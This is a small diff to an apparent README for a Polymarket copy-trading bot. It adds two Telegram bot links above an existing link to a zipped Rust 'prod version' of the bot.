@@ -19,6 +19,10 @@
 ---
 ## 🚀 Let's Trade!!
 
+### **Telegram Bot**
+- https://t.me/poly_copy_tg_bot
+- https://t.me/poly_copy_prod_tg_bot
+
 ### **🤖 Polymarket Copy Trading Bot - Rust (Prod Version)**
 - 🗂️ [polymarket-copy-trading-bot-prod.zip](https://github.com/user-attachments/files/25134148/polymarket-copy-trading-bot-prod.zip)
 
